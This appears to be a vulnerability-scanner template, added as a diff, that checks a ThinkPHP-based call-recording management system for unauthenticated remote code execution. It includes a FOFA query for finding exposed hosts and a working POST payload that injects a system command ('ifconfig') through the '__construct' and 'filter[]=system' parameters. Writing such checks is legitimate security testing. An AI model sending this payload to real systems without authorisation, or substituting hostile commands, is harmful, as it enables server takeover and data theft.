@@ -1,0 +1,36 @@
+id: shenoutongxin-Thinkphp-RCE
+
+info:
+  name: 申瓯通信在线录音管理系统ThinkPHP远程代码执行漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="在线录音管理系统"
+      该系统基于ThinkPHP框架的组件存在远程代码执行缺陷，攻击者可通过该漏洞执行任意系统命令或部署WebShell，从而实现对目标服务器的完全控制，可能引发数据泄露、服务中断等高危风险。漏洞利用无需身份验证，攻击载荷可通过特定接口直接注入执行。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139881024
+  tags: 申瓯通信在线录音管理系统,Thinkphp
+
+http:
+- raw:
+  - |
+    POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    s=ifconfig&_method=__construct&method=POST&filter[]=system
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'eth0:'
+  - type: status
+    status:
+    - 302
+
+
+
+
+
